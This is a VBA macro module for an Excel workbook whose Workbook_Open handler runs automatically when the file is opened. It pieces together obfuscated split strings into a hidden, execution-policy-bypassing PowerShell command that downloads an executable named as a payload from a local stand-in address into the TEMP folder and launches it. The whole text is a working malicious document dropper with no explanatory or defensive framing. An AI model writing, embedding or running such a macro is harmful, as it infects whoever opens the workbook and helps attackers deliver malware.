Attribute VB_Name = "ThisWorkbook"
Private Sub Workbook_Open()
    Dim cmd As String
    Dim objShell As Object
    Dim url As String, outPath As String
    url = "http:" & "//127.0." & "0.1:90" & "90/pay" & "load.ex" & "e"
    outPath = Environ("TEMP") & "\obliv" & "ionx_p" & "ayload.ex" & "e"
    cmd = "powershel" & "l.exe" & " -NoP" & "rofi" & "le -" & "WindowSty" & "le Hidd" & "en " & _
          "-Executio" & "nPolicy" & " Bypa" & "ss -Co" & "mmand" & " " & Chr(34) & _
          "(New-Object System.Net.WebClient).DownloadFile('" & url & "','" & outPath & "'); " & _
          "Invoke-Item '" & outPath & "'" & Chr(34)
    Set objShell = CreateObject("WScript." & "Shell")
    objShell.Run cmd, 0, False
End Sub
